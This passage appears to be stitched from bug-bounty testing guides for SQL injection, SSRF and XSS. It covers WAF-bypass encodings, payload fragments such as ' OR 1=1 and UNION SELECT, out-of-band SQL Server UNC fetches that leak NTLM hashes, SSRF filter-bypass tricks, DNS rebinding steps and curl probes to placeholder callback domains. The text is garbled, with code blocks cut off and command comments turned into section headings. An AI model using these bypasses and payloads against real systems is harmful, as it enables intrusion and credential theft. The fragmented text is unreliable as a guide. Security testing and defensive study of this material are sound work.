(`INSERT INTO logs (ua, referer, ip) VALUES ('<ua>', ...)`), analytics tables, and
session middleware querying `WHERE cookie='<sid>'` are the classic sinks (and they
feed second-order V-07 when an admin views the log). Probe *every* header the
variants' preconditions call for, in this order of likelihood: `Cookie` (session
lookup), `User-Agent`/`Referer` (log insertion — trigger the consumer by making the
app re-parse its logs), `X-Forwarded-For` (rate-limit/geo lookups), custom headers
(`X-Request-Id`, `X-Original-URL` reaching WAF-bypass rewrite queries). Same
detection ladder: `'` probe → boolean pair → delay → OOB. Note: header payloads
need encoding (space/`%0a` for raw HTTP/2 constraints), and Burp's Repeater lets
you edit headers directly — don't forget the `Host`-adjacent headers a WAF ignores
but the app parses.

### [Bugbountyskills.md] Encoding bypasses (URL / hex / base64 / unicode, double encoding)

- **URL encoding**: `%27` = `'`, `%20`/`%09`/`%0a` = whitespace, `%3b` = `;`, `%23` = `#`. Send raw and encoded variants — encoding *after* the app decodes is what reaches SQL.
- **Double encoding**: `%2527` — survives one decode pass (WAF sees `%27`, app decodes again to `'`). Works only when the app decodes twice or the WAF and app disagree on decode count — test both `'%27` and `%2527`.
- **Unicode/overlong**: fullwidth `＇` (U+FF07), `％`, overlong UTF-8 `0xC0 0xA7` — only useful where a normalizer folds them to ASCII *before* query build (Java NFKC, some PHP mb filters). Test normalization by planting the unicode variant and reading back.
- **Hex**: MySQL `0x276f72...` for string literals (no quotes needed), `UNHEX()`.
- **Base64**: only matters when the app base64-decodes before SQL (`FROM_BASE64`, `atob`, `Buffer.from(...,'base64')`) — the WAF sees ciphertext; spot it by payloads that fail in cleartext but work base64-wrapped inside the decoded layer.
- **Newline/tab in SQL**: MySQL tolerates `/**/` and newlines as token separators (also splits naive WAF regexes `UNION[\s]+SELECT`).
- Rule: encode *after* mapping the decode pipeline (proxy → WAF → app → framework → DB). `payloads.md` §4 has the table.

### [Bugbountyskills.md] Case-sensitivity and alternative-logical-operator bypasses

- **Case**: SQL keywords are case-insensitive (`sElEcT`, `uNiOn`) — pair with WAF randomization (`%43`-style percent-encoding of one letter, `UnIoN`); MySQL *table/column* names are case-sensitive on Linux (`Users` ≠ `users`), so a "working" query on the wrong case is a classic false negative.
- **Logical operators**: `||` for `OR`, `&&` for `AND` (MySQL), `!` for `NOT`, `|`/`&` bitwise where a boolean is coerced; `AND`→`&`-style single-char swaps (`%7c`, `%26`) slip signature filters; ANSI `AND 1<>1` instead of `AND 1=0`; `NOT 1=2` instead of `=`.
- **Whitespace-free logic**: `1'||'1'='1`, `1'&&(1=1)-- ` — no space needed before `(`/`||` in most engines.
- **Rlike/Like/Ilike**: `LIKE 0x25...` (hex pattern) bypasses quote-heavy regex filters; Postgres `ILIKE` for case-insensitive; `~` regex operator.

### [Bugbountyskills.md] String-concatenation obfuscation

Where the payload must *build* a string at the DB (or hide one from the WAF):
MySQL `CONCAT('a',0x62,'c')`, `CONCAT_WS`, `CHAR(97,98,99)` (no literals at all —
beats literal-matching WAFs), `0x616263` hex literals, `REVERSE()`, `MID(a,1,1)`
instead of substr-with-literals; Postgres `chr(97)||chr(98)`, `decode('6162','hex')`;
Oracle `CHR`/`UTL_RAW.CAST_TO_VARCHAR2`; MSSQL `CHAR`/`0x61` + `CAST`. Use
concat-obfuscation inside `LOAD_FILE`/OOB hosts (V-05) so the target domain never
appears in one piece in the request — that defeats URL-fragmenting WAFs.

### [Bugbountyskills.md] Blind OOB HTTP/SMB variants (when DNS is blocked but HTTP/SMB isn't)

When DNS egress (V-05) is filtered but the DB can still open TCP: HTTP OOB via
Oracle `UTL_HTTP.REQUEST('http://<nonce>.<oast>')`, SQL Server
`xp_fileexist '\\<host>\<share>'` / `OPENROWSET` / `xp_dirtree` UNC fetch
(SMB: your listener on 445 sees the auth attempt — leak NTLMv2 hash of the service
account = credential material, chain to `ssrf-testing`/`info-disclosure-testing`),
MySQL `LOAD_FILE('\\\\<host>\\share')` UNC read, Postgres `dblink`/`http` extension.
Detection: constant-host callback first (nonce per probe), confirm source IP is the
DB host, then encode data in the path/query (`/<offset>-<char>` per request — one
bit/char per callback). Timing-blind variant: if the *fetch itself* is conditional
(`CASE WHEN <cond> THEN fetch END`), callback presence is your boolean — no DNS
needed at all. FP rules mirror V-05: fresh nonces, no wildcard domains, no
client-side fetches (check source IP).

## [Bugbountyskills.md] B-1. Attack taxonomy → coverage checklist (Doupé et al. [10]; OOB per Clarke [3])

Nine canonical classes. Use as a *coverage checklist*: for each sink you should be able to
state which classes were possible and which you ruled out — a class never considered is a
class never tested.

| # | Class | Mechanism / what it buys | Skill variant |
|---|---|---|---|
| 1 | Tautology | conditional always true → auth bypass / row over-match (`' OR 1=1; --`) | V-03 boolean + `business-logic-testing` auth flows |
| 2 | Logically incorrect query | force syntax/type/logical error → identify injectable params; error text reveals table/column names and column types | V-01 error-based |
| 3 | Union query | append attacker's result set to the app's (`UNION SELECT`) | V-02 union |
| 4 | Piggy-backed (stacked) | `;` + second statement → any command, *if* the DB config allows multi-statements | V-06 stacked |
| 5 | Stored-procedure attack | unvalidated input reaching a proc's body/args behaves like inline SQL; `EXEC`/`CALL` wrappers | V-06 stacked → V-10 DB exec |
| 6 | Inference (boolean + timing) | no errors needed; branch on true/false condition or measured delay (`AND 1=0` vs `AND 1=1`, `WAITFOR`/`SLEEP`/`pg_sleep`) | V-03 / V-04 |
| 7 | Alternate encoding | hex/ASCII/URL/Unicode encoding slips unsafe-char filters (`%20%55%4E%49%4F%4E...` = `UNION...`) | `references/payloads.md` §4 |
| 8 | Second order | payload stored now, concatenated into a *later* query | V-07 / V-15 |
| 9 | Out of band | different channel returns data — DNS via `xp_dirtree` UNC to your domain, HTTP fetch, mail | V-05 OOB |

Two takeaways the thesis proves empirically, not hypothetically:

- **A failed stacked probe proves nothing about the other eight classes.** Piggy-backed
  success "depends on the database configuration allowing multiple statements" — many
  hardened apps block `;` and are still wide open on boolean/union/error.
- **Second order is the blind spot of every scanner.** No scanner in the study — including
  the best one — found WackoPicko's second-order bug; only a manual path found it
  (register user with payload in the name → trigger on `similar.php`). Storage request and
  trigger request are separate, may be far apart in time, and scanners' payloads are
  built for first-order shapes. Treat V-07/V-15 as a **manual discipline**: plant a
  marker, then walk every later feature that could re-read it.

## [Bugbountyskills.md] B-2. The node method: inventory → dedup → per-node detection

ModuleMatcher's real contribution is the abstraction. Every input-bearing surface becomes
a *node*:

```json
{"url": "...", "parameters": ["p1","p2"], "data": "p1=v&p2=v",
 "cookies": ["SESSION=..."], "method": "post"}
```

Operationalize it as an engagement loop:

1. **Emit one node per (URL × method × param-set)**, cookies + auth state included —
   streamed as discovered, never batched at the end (a page found at minute 50 must be
   testable at minute 51).
2. **Dedup nodes exactly.** Same node reached twice = one target, not two — prevents
   double rate-limit burn (their wrapper kept an `attacked_nodes` list for this).
3. **Detection runs per node, threaded** — but under the sqli SKILL §1 rate caps. The
   thesis had to throttle parallel scanners because heavy load on single pages crashed
   the test instrumentation: load-crash is real on brittle targets, keep bursts small.
4. **Coverage gates discovery; the fuzzer only ever attacks what the crawl emitted.**
   When a scan reports 0 vulns, the first question is "what did we never reach?", never
   "which payload failed?".

Feeding one node to sqlmap — their appendix command, verbatim shape:

```bash

## [Bugbountyskills.md] thesis appendix (full-crawl mode)

sqlmap -u '<URL>' --crawl=400 --batch \
  --answers='skip=N,continue=Y,proceed=X,keep testing=Y' \
  --flush-session --forms -v 1 --cookie '<COOKIE>'

## [Bugbountyskills.md] per-node mode (their wrapper's construction):

## [Bugbountyskills.md] -u <url>  --cookie <cookies>  --data <body>   (when method==post)

## [Bugbountyskills.md] --forms                                          (when method==get)

## [Bugbountyskills.md] -p <parameters>                                  (explicit param list)

```

## [Bugbountyskills.md] B-4. Detection reliability → why the differential method exists

From their fuzzing-theory section (matches SKILL §4, but with the *why*):

- SQLi cannot be reliably detected from a response alone: time-based signals drift on
  unstable networks; TRUE/FALSE is ambiguous when the page varies for unrelated reasons;
  **response length alone is not an oracle** — the rest of the page may change regardless
  of the query result.
- **Differential method:** freeze everything volatile (cache-bust, same session, same
  nonce), compare structure — not just length — repeat each probe 3-5× and demand
  determinism, then corroborate on a second channel (error ↔ boolean ↔ timing ↔ OOB).
- **Fingerprint the DBMS before the payload ladder:** PostgreSQL is case-sensitive where
  MySQL is not; quote-style acceptance differs; sleep functions differ (`SLEEP` /
  `WAITFOR` / `pg_sleep` / `DBMS_PIPE.RECEIVE_DELAY`). Wrong-DB payloads produce clean
  misses that masquerade as "not vulnerable".
- In their run, every tool-reported vuln was **manually verified before counting** —
  tool output is a lead (SKILL §4), never a finding.

## [Bugbountyskills.md] B-5. Defense recognition → which payloads are even possible

From the source analysis of why osCommerce survived all four scanners untouched:

| Defense you observe | How you know it fired | Payload consequence |
|---|---|---|
| Integer typecast `(int)$x` | non-numeric input consistently dies *before* the DB (uniform behavior, no SQL error) | string-context payloads never land — pivot to non-cast slots (`ORDER BY`, identifiers) or second-order paths |
| `addslashes` / `mysql_real_escape_string` | quotes neutralized; backslash echoes in error text | escape-class bypasses only (widechar/GBK, `NO_BACKSLASH_ESCAPES` charset mismatch) or non-string contexts |
| Validator (`is_numeric`, `FILTER_VALIDATE_EMAIL`, `ctype_digit`) | *app* validation errors fire first (`"Bad email!"`) before any DB effect | the payload must **pass the validator**: email-lookalike shapes for email fields, digits-only for numeric slots — or move to a sibling param that lacks the validator |
| True prepared statement (two-stage bind) | no response change at any payload depth on that param | stop burning it; test sibling params in the *same* request (B-3.1), identifier/sort slots, and second-order paths |

Discipline: **"blocked by app validation" ≠ "blocked by WAF" ≠ "not injectable."** The
remediation — and your next move — differ for each.

## [Bugbountyskills.md] B-6. Coverage-first engagement loop (the thesis's headline result)

Blackmap's win was *coverage* (279% more lines than the others, on average) with the same
sqlmap underneath; the only detection change was `keep testing=Y`. Loop:

```
crawl → node inventory (B-2) → classify sinks (SKILL §2) → fuzz EVERY param per node
  → coverage-gap check: "what did we never reach?"
      → causes in check order: JS-event params → iframes → auth re-crawl
        → inter-state creations → loop starvation (B-3)
  → re-crawl those paths → fuzz → manual spot-probe high-value params
  → confirm on 2 channels (SKILL §4) → report (SKILL §5)
```

**False positives:** their WackoPicko/WordPress/osCommerce tables counted only manually
confirmed vulns — replicate that discipline; a scanner's silence or shout is data, not
proof.

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & fetch-point inventory.** Enumerate every endpoint that accepts
   data flowing toward a server-side fetch: URL-ish params (`url`, `next`,
   `callback`, `webhook`, `dest`, `host`, `ip`, `endpoint`, `target`),
   import-from-URL/export features, link previews/oEmbed, avatar/logo fetch,
   PDF/print/HTML-render features, sitemap/news crawlers, health/check-site
   tools. Pull routes from JS bundles, OpenAPI/Swagger specs, mobile API
   dumps, and historical responses. Sink coverage — not payload cleverness —
   determines what you can find at all.
2. **Sink classification.** Synchronous fetch with visible result vs async
   worker (blind); scheme handling (`http/https` only vs pass-through);
   destination validation (none, blocklist, allowlist, resolve-and-pin);
   redirect following; verb/header control (needed for IMDSv2 and gopher).
   This classification picks your variant and your evidence channel.
3. **Variant selection.** Route the observed signal through the table in §3
   and read the matching variant section in `references/variants-1.md`. One
   signal often maps to several variants (an allowlisted-hostname fetch could
   be parser-differential *or* rebinding); test the cheapest discriminators
   first — the redirect-based bypass costs one request and often is the whole
   finding.
4. **Safe probe.** Rung 1 only: point the fetch at
   `http://<OOB_DOMAIN>/ssrf-<TOKEN>` and wait out the async window. Confirm
   the hit's source IP/ASN is the app's egress, not your own browser. No
   internal addresses, no metadata, no schemes beyond http(s) at this stage.
5. **Confirmation test.** Reproduce with a second, independent signal:
   collaborator hit *plus* reflected internal content; hit *plus* reproducible
   timing differential against a control port; identity field fetch *plus*
   repeatability. A bare DNS hit or a single slow response is a lead.
6. **Impact proof.** Demonstrate the minimum real impact: the rungs reached
   (localhost, link-local, RFC1918), one internal hostname, the cloud role
   *name*. Stop there.
7. **False-positive filter.** Work through each variant's **False positives**
   section: browser-side fetches, CDN edge fetches, hostname reflection
   without fetch, security-gateway unfurling, single-sample timing claims.
   Rule every alternative explanation out before writing anything up.
8. **Report.** Use the template in §4. Redact internal hostnames, tokens,
   and credential material beyond what proves impact. Attach raw
   request/response pairs with your collaborator domain shown as a
   placeholder.

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| `url`/`host`/`ip` param fetches content; internal addresses return data or timing differs by port | V-01 basic SSRF scanning | `references/variants-1.md` |
| Callback-only hit with no response change; feature is an async job/queue/webhook test | V-02 blind SSRF pipelines | `references/variants-1.md` |
| App can reach `169.254.169.254`, `metadata.google.internal`, Azure `metadata` endpoint | V-03 cloud metadata extraction | `references/variants-1.md` |
| Filter blocks direct IPs but allows your hostname; hostname is in your control; filter checks URL only, your box redirects | V-04 DNS rebinding / redirect bypass | `references/variants-1.md` |
| URL param passes `gopher://`, `dict://`, `ftp://`, `file://` schemes through | V-05 protocol smuggling | `references/variants-1.md` |
| PDF generation, wkhtmltopdf/Chromium print, image conversion, HTML→PDF export features | V-06 PDF/image rendering SSRF | `references/variants-1.md` |
| Command output/timing after `;`, computed `{{7*7}}`, serialized blobs, upload execution | → `rce-testing` | sibling skill |

## [Bugbountyskills.md] 4. Verification standard

A confirmed SSRF finding requires all of the following; anything less is a
lead and gets reported as a lead:

1. **Reproducible request + response pair.** The exact HTTP request (headers,
   body, auth state) and the server's response, captured at least twice with
   the same result. Paste-ready for triage.
2. **A second, independent signal.** Two orthogonal proof channels: e.g.
   collaborator HTTP hit from the app's egress IP *and* reflected internal
   content; identity field *and* repeatability. One signal can be mimicked by
   browsers, CDNs, and link unfurlers; two cannot plausibly co-occur by
   accident.
3. **Minimal-impact impact proof.** Rungs reached, one internal hostname, the
   cloud role *name*. Never credential dumps, never bulk internal data, never
   state-changing commands against internal services.
4. **False-positive audit documented.** Name the alternative explanations you
    ruled out (client-side fetch, CDN edge, hostname echo, scanner
    unfurling) in the report's evidence section.

### [Bugbountyskills.md] Title

`SSRF in <parameter/feature> at <endpoint> (V-XX)`

**Severity:** <Critical/High/...> — one-line justification
**Endpoint:** `POST /api/<path>` — parameter `<param>` (<auth state required>)
**Summary:** 2-3 sentences: the fetch sink, the controllable destination, the proven reach.

**Steps to reproduce:**
1. <Authenticate as <role> / no auth required>
2. Send: `<redacted raw request with <PLACEHOLDER> for collaborator values>`
3. Observe: <collaborator hit from <EGRESS_IP> at <timestamp> / internal
   content marker / role name `NAME`>

**Impact:** What an attacker gains (destination control from app egress,
rungs reached, which cloud role and what its policy implies) and the
realistic worst case. For metadata access: name the role and permissions —
never include credentials or tokens.

**Evidence:** Redacted request/response pairs; collaborator log with your
domain masked; timestamps; source-IP/ASN of the callback.

**Remediation:** One specific fix for this sink (egress allowlist at network
layer + resolve-once-pin-IP validation, scheme allowlist after parsing,
IMDSv2 hop limit 1, renderer network namespace).

**References:** CWE-918; OWASP Top 10 A10:2021; variant V-XX in
ssrf-testing skill.
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for all six variants (V-01 … V-06); read
`references/payloads.md` when you need the probing ladder, request
templates, tool commands, or evasion encodings.

Each variant section is self-contained: mechanism, preconditions, numbered
detect steps, a proof-of-concept template with `<PLACEHOLDER>` slots, the
independent confirmation signal, false positives, impact phrasing, a
sink-specific remediation, and the CWE/OWASP mapping. Match your observed
signal to §3, open that variant, and work top to bottom.

## [Bugbountyskills.md] 0. Safe-first detection ladder

**Rule: the first signal is always an out-of-band callback to a domain or
collaborator you control.** Climb in this order and stop as soon as you have
two independent signals:

1. **OOB DNS/HTTP callback** — zero impact, proves server-side fetch. Use a
   unique path/token per test (`/ssrf-001`, `<TOKEN>`) so delayed or
   duplicate hits are attributable. Check the source: the app's egress
   IP/ASN with a non-browser UA = server-side; your own IP/browser UA =
   client-side, not SSRF.
2. **Error/timing differentials** — distinguishable failures (DNS-fail vs
   connection-refused vs HTTP 500) and open/refused/filtered timing bands
   with a control port and two samples each.
3. **Internal content marker** — one hostname/banner from an internal
   address, reflected in the response or embedded in a returned artifact.
4. **Cloud identity** — role *name*, service-account email, VM ID.
5. **Impact ceiling for production** — the rungs reached, one internal
   hostname, the role name. Stop. Do not dump credentials, do not read
   internal user data, do not write to internal services.

Collaborator setup (templates):

```bash

## [Bugbountyskills.md] DNS-only probe when HTTP egress is filtered:

nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN> <YOUR_NS>
```

## [Bugbountyskills.md] 2. Filter-bypass & evasion tricks

| Trick | Example | Bypasses |
|---|---|---|
| Parser differential (userinfo) | `http://allowed.tld@127.0.0.1/` | Allowlists checking authority incorrectly |
| Parser differential (fragment) | `http://allowed.tld#@127.0.0.1/` | Naive URL parsers |
| Redirect pivot | your box 302s to internal after passing the check | Filters validating only the initial URL |
| IPv6 encoding | `http://[::ffff:7f00:1]/` | IPv4-only denylists |
| Loopback DNS names | `localtest.me`, `127.0.0.1.nip.io` | Literal-IP blocklists (these are V-01 rungs, *not* rebinding) |
| Decimal/hex/octal IP | `2130706433`, `0x7f000001`, `0177.0.0.1` | Regex denylists on `127.` |
| Scheme case flip | `GoPher://`, `FILE://` | Case-sensitive scheme filters |
| Encoded newline (gopher) | `gopher://<HOST>:<PORT>/_%0d%0a` | HTTP verb/header control via raw bytes |
| Double URL-encode | `%252f` | Double-decoding pipelines |
| DNS rebinding | TTL-0 alternating A records | Resolve-then-fetch TOCTOU (own variant V-04) |

Honesty note: overlong UTF-8 and null-byte tricks are dead on modern stacks —
test once, don't build a report on them.

## [Bugbountyskills.md] OOB hit confirmation with attribution

curl -s "https://<TARGET>/api/fetch?url=http%3a%2f%2f<TOKEN>.<OOB_DOMAIN>%2fssrf-001"

## [Bugbountyskills.md] DNS rebinding automation

## [Bugbountyskills.md] own authoritative NS with TTL-0 alternating A records, or a rebinding

## [Bugbountyskills.md] service; probe order: public→127.0.0.1, then public→169.254.169.254

dig +short yourdomain.tld @<YOUR_NS>        # verify alternation is live

## [Bugbountyskills.md] 4. Chain it with

- **`rce-testing`** — SSRF is the delivery, code execution is the payload:
  gopher'd writes to internal services, config-override endpoints reached
  internally, or a fetcher that shells out with the URL. Report the chain;
  execution framing belongs there.
- **`path-traversal-testing`** — `file://` reads and `php://`/wrapper chains
  are traversal-class primitives reached through a URL param; LFI detail
  lives there.
- **`info-disclosure-testing`** — feed the SSRF target list: leaked `.env`
  files, sourcemaps revealing sink code, stack traces naming internal hosts,
  bucket/registry URLs, and metadata role names observed in docs. Redact any
  secrets you find — report the leak class, don't hoard the material.
- **`business-logic-testing`** — webhook configuration flows and
  OAuth `redirect_uri`/`jku`-style URL controls are where SSRF-shaped
  sinks usually hide behind multi-step logic.
- **`csrf-testing`** — CSRF on an admin webhook/URL field turns *their*
  session into your SSRF trigger (blind, but real).
- Suite neighbors: `bac-idor-testing` (reaching fetch endpoints owned by
  other tenants), `xss-testing` (SSRF-to-local-preview-service rendering
  attacker HTML).

## [Bugbountyskills.md] Table of contents

- [V-01: Internal network mapping via basic SSRF scanning mechanisms](#v-01-internal-network-mapping-via-basic-ssrf-scanning-mechanisms)
- [V-02: Infrastructure verification via asynchronous blind SSRF pipelines](#v-02-infrastructure-verification-via-asynchronous-blind-ssrf-pipelines)
- [V-03: Cloud infrastructure takeover via metadata API instance extraction](#v-03-cloud-infrastructure-takeover-via-metadata-api-instance-extraction)
- [V-04: Network restriction bypass via automated TTL DNS rebinding](#v-04-network-restriction-bypass-via-automated-ttl-dns-rebinding)
- [V-05: SSRF via protocol smuggling (Gopher/DICT/FTP tunnelling)](#v-05-ssrf-via-protocol-smuggling-gopherdictftp-tunnelling)
- [V-06: SSRF via PDF/image rendering engines and cross-origin objects](#v-06-ssrf-via-pdfimage-rendering-engines-and-cross-origin-objects)

## [Bugbountyskills.md] V-04: Network restriction bypass via automated TTL DNS rebinding

**Mechanism:** The fetcher validates a hostname (resolve → check IP against a
deny/allowlist) and then connects by *resolving again* — a classic TOCTOU.
Attacker-controlled DNS answers "safe public IP" to the validator and
"internal/metadata IP" to the connector (TTL 0 or alternating answers).
The violated assumption is "the checked IP is the connected IP"; filters
that block `127.0.0.1` literals fall without any allowlist bypass at all.

**Preconditions:**
- SSRF filter resolves/validates before fetch, fetcher re-resolves (no pinning)
- Attacker controls DNS for a domain: an authoritative NS you run, or a
  rebinding service (`rbndr`-style alternating A records)
- Resolver/load-balancer does not cache long enough to defeat the flip
  (positive TTL caching is the main obstacle)

**Detect:**
1. Establish the two-resolution pattern: direct `http://127.0.0.1/` is
   blocked, but `http://<YOUR_DOMAIN>/` passes the filter — filter is
   hostname-or-IP-based and yours resolves "clean" initially.
2. Set up automated TTL rebinding (payloads.md §3): your NS alternates
   A records `public_ip` / `127.0.0.1`, TTL 0; run many attempts because
   resolvers cache the first answer (Go's resolver, JVM, LB caches).
3. Probe order: rebind `public → 127.0.0.1` first (prove internal read with
   localhost content in the response), then `public → 169.254.169.254`
   (identity-only evidence per V-03's rule).
4. Cheap variant worth testing first: **redirect-based** — filter checks the
   initial URL only, your endpoint 302s to `http://127.0.0.1/`. Often the
   whole finding without any DNS trickery; same impact class.
5. Automate: script loop `{ rebind → fetch → check marker } 100x`, look for
   the first hit containing localhost-specific content (headers, body size
   band, internal banner).

**Proof of concept:**
```
GET /api/fetch?url=http://<PLACEHOLDER_REBIND_DOMAIN>/ HTTP/1.1

1st DNS answer (validator):  <PUBLIC_IP>       → passes filter
2nd DNS answer (connector):  127.0.0.1         → internal fetch

## [Bugbountyskills.md] then: 169.254.169.254 → identity proof only (V-03 rules apply)

```

**Confirm:** Internal content / metadata identity appears *through* your
hostname while direct `http://127.0.0.1/` is still blocked — the differential
is the proof of filter bypass; reproduce it at least twice (rebinding is
flaky, so log the flip sequence).

**False positives:** The filter actually re-resolves and pins: your "rebind"
responses came from the public IP serving 200s that merely *look* internal —
compare body contents against a direct fetch of your public server. Static
loopback DNS names (`localtest.me`, `nip.io`) are **not** rebinding — they
test V-01 encoding bypasses; don't label them V-04. CDN-hosted targets
resolving from anycast edges produce convincing-but-wrong diffs.

**Impact:** Turns partial/naive SSRF into full localhost + metadata access —
phrase as "hostname-based SSRF filter bypassed via DNS rebinding →
`<rungs reached>` reachable", with V-03 identity evidence where applicable.

**Remediation:** Resolve once, validate that IP, and connect to the pinned
IP; re-validate after every redirect; enforce IP-range deny at connect time
(server-side socket level), not just at URL-parse time.

**CWE / OWASP:** CWE-918 (SSRF, TOCTOU); CWE-367 (Race Condition);
OWASP A10:2021 SSRF.

## [Bugbountyskills.md] then:  src=http://127.0.0.1/ or http://169.254.169.254/... (identity only)

## [Bugbountyskills.md] exfil: src=http://<internal>/admin → marker appears in returned PDF

```

**Confirm:** Collaborator HTTP hit for the planted resource (renderer UA,
source = app egress IP) **and** — when claiming full-read — the fetched
content present in the returned artifact, extracted as a single marker.
Two signals; re-render with a fresh token to show repeatability.

**False positives:** Client-side print (browser fetches from the *victim's*
network — check hit UA/source IP). Image proxies that HEAD/validate against
an allowlist before fetching (validation fetch ≠ app fetch — verify origin).
Hits produced by your own browser previewing the document. CDN/cached PDFs
returned without re-render (no hit = retest with cache-buster).

**Impact:** SSRF with an exfiltration channel — internal admin content
returned inside the downloaded artifact, plus metadata reachability (V-03
rules) — typically Critical. Phrase as "server-side renderer fetches
arbitrary URLs incl. `<rungs>`; fetched content embedded in output artifact".

**Remediation:** Render in network-namespaced containers with egress deny;
disable remote resource loading (Chromium `--disable-remote-fonts`/offline
mode, wkhtmltopdf `--disable-external-links`, WeasyPrint URL fetch
overrides); sanitize doc HTML to an allowlist of tags/attrs with no URLs.

**CWE / OWASP:** CWE-918 (SSRF) with CWE-73 (external file/name control);
OWASP A10:2021 SSRF.

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & endpoint inventory.** Enumerate every entry point before testing anything:
   query parameters, form fields (GET and POST), JSON body keys, multipart filenames,
   headers that get logged and rendered (User-Agent, Referer, X-Forwarded-For), cookies,
   stored fields (profile, comments, tickets), and anything embedded into the DOM
   server-side (JSON-LD, `window.__DATA__` blobs). Fingerprint the stack: JS framework,
   sanitizer library and version, CSP header, cookie flags, cache layers. *Why:* 80% of
   missed XSS is a missed parameter, and the right variant depends entirely on the stack.

2. **Parameter & sink mapping.** Classify each entry point as reflect-now, store-then-render,
   or client-side-only. For client-side paths, map sources (`location.*`, `document.URL`,
   `window.name`, `postMessage`, `localStorage`) to sinks (`innerHTML`, `document.write`,
   `eval`/`Function`/string-`setTimeout`, `.src`/`.href` assignment, jQuery `$(...)` in
   HTML mode). *Why:* you cannot pick a variant without knowing where the tainted bytes
   actually land — server-rendered, framework-compiled, or sink-assigned.

3. **Variant selection.** Use the table in section 3 to map your observations to 2-3
   candidate variants. Do not spray forty payloads at one parameter; a focused probe set
   that respects the reflection context finds more and trips fewer WAFs.

4. **Safe probe.** Send a harmless, unambiguous marker (`<zz1>`, `'><zz2>`) and inspect the
   raw response bytes: where exactly does it land (tag text, quoted attribute, JS string,
   URL position), and what encoding was applied? *Why:* the reflection position decides the
   entire payload family; guessing this from the URL path is how juniors burn their one
   clean payload slot.

5. **Confirmation test.** Replace the marker with a context-correct payload that proves
   execution without touching data — typically `alert(document.domain)` or an element the
   payload inserts. Run it in a real browser (headless is fine) and capture console output
   or the rendered DOM. *Why:* a reflected string is not XSS; execution is.

6. **Impact proof.** Escalate only as far as needed to justify severity: show the executing
   origin, whether CSP/Trusted Types/HttpOnly blocked any step, and who else can trigger it
   (self-only vs. stored-for-others vs. blind-admin). Use your own test account's data for
   any "stolen value" demonstration.

7. **False-positive filter.** Before writing anything, re-check the classic mimics: HTML-
   encoded echo that looks like a hit in a grep, JS-escaped JSON that never reaches a sink,
   self-XSS requiring an unrealistic user action, WAF error pages echoing your probe, and
   client-side-only execution on a page you control yourself. Confirm with a second,
   independent signal — a different browser, a clean session, or the raw response bytes.

8. **Report.** Use the template in section 5. Include the exact request/response pair, the
   context analysis (which is what makes triage fast), the execution proof, honest severity
   with the mitigating controls named, and per-variant remediation.

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| Input echoes into HTML body unencoded on the same request | V-02 (reflected, HTML context) | variants-1.md |
| Only POST/JSON/form parameters reflect; GET does not (or vice versa) | V-01 multi-transport matrix | variants-1.md |
| Reflection lands in a quoted/unquoted attribute or event handler | V-02 (attribute / event-handler context) | variants-1.md |
| Reflection lands in `href`/`src`/`action`/`formaction` URL position | V-02 (URL context), possibly V-13 | variants-1.md |
| Input passes through Angular/Vue/Svelte interpolation (`{{...}}`, `${...}`) | V-08 CSTI | variants-1.md |
| Payload appears in a later request/response, not the one you sent | V-04 stored | variants-1.md |
| Nothing in any response; you control an admin-seen field (ticket, comment, log) | V-05 blind / OOB | variants-1.md |
| Input flows from URL/hash/postMessage/localStorage into a JS sink | V-03 DOM-based | variants-1.md |
| Sanitizer present but payload mutates into active markup after a parse/serialize round-trip | V-07 mXSS | variants-1.md |
| Attacker-controlled JSON changes `Object.prototype`, then the page misbehaves or executes | V-09 prototype-pollution XSS | variants-1.md |
| SOP seems broken / cross-origin DOM access works — suspect the browser, not the app | V-06 UXSS | variants-1.md |
| One payload family should work in several places; reflection context unknown | V-10 polyglots | variants-2.md |
| Keyword filters block `script`/`alert` but symbol-only payloads pass | V-11 non-alphanumeric encoding | variants-2.md |
| WAF 403s obvious payloads, but the app double-decodes or renders entities | V-12 encoding evasion | variants-2.md |
| Input reaches `eval`, `Function`, string-`setTimeout`, `$.globalEval`, `location=` | V-13 indirect sinks | variants-2.md |
| Upload/preview/export of SVG, PDF, Markdown, or XML files | V-14 file/vector formats | variants-2.md |
| Payload fires on a later visit, or a clean session sees your input via the cache | V-15 second-order / cache | variants-2.md |
| Page loads relative `script src`/CSS paths; you influence path resolution | V-16 RPO | variants-2.md |
| User content served with wrong/missing Content-Type, no `nosniff`, sniffable body | V-17 MIME sniffing | variants-2.md |
| CSP contains `require-trusted-types-for 'script'` | V-18 Trusted Types | variants-2.md |
| HTML entity/Unicode escapes survive intact into the rendered DOM | V-12 (entity/Unicode notes) | variants-2.md |
| Legacy IE target; `VBScript:` or `language=VBScript` relevant | V-02 (VBScript sub-context) | variants-1.md |

## [Bugbountyskills.md] 4. Verification standard

A **confirmed finding** requires all four:

1. A reproducible request + response pair (raw bytes, not a browser screenshot of the URL
   bar) showing the unencoded/decodable reflection or the storage-then-render path.
2. Execution proof in a real browser for the exact origin: console alert, debugger hit at
   the sink, or an inert DOM marker the payload created.
3. A second independent signal: same result from a second browser engine or a clean
   session, plus the context analysis showing *why* it executes (which tag/attribute/string
   was broken out of).
4. Honest mitigation notes: CSP directives and whether they blocked anything, HttpOnly,
   Trusted Types, sandbox attributes, interaction required (click vs. load).

Anything less is a **lead**: reflection without execution evidence, a payload that only
works encoded-decoded in your tooling but never in a browser, or a stored value you could
not observe rendering. Label leads as leads; claiming unexecuted reflections as XSS is the
fastest way to lose credibility in a program.

## [Bugbountyskills.md] Summary

<2-3 sentences: which parameter, which context, which variant, who can trigger it.>

## [Bugbountyskills.md] Steps to reproduce

1. <Auth state / prerequisite, e.g. "Log in as a free-tier user.">
2. Send: <exact request, redacted, with placeholders for secrets>
3. Observe: <raw response bytes OR rendered DOM / console output>
4. <Browser + version used for execution proof>

## [Bugbountyskills.md] Impact

<What an attacker achieves, in data/action terms: e.g. "Arbitrary JS runs in
victims' sessions on host.origin; an attacker can perform actions as the victim,
including <top-privilege-role> if they visit the stored comment. CSP absent.">

## [Bugbountyskills.md] Remediation

<Per-variant specific fix — e.g. "Context-aware output encoding at the template
layer for the q reflection; do not rely on the client-side sanitizer.">

## [Bugbountyskills.md] References

- CWE-79 (Improper Neutralization of Input During Web Page Generation)
